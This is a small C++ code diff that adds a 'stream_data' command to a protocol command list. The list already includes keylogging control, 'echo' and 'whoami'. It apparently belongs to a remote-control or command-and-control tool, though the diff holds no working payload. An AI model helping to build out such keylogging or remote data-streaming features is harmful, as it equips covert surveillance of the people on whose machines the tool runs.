@@ -44,6 +44,8 @@ namespace Protocol {
 
         static constexpr const char* ECHO = "echo";
         static constexpr const char* WHOAMI = "whoami";
+
+        static constexpr const char* STREAM_DATA = "stream_data";
     }
 
     inline const std::unordered_set<std::string>& validCommands() {
@@ -68,7 +70,9 @@ namespace Protocol {
             TYPE::STOP_KEYLOG,
 
             TYPE::ECHO,
-            TYPE::WHOAMI
+            TYPE::WHOAMI,
+
+            TYPE::STREAM_DATA
         };
         
         return types;
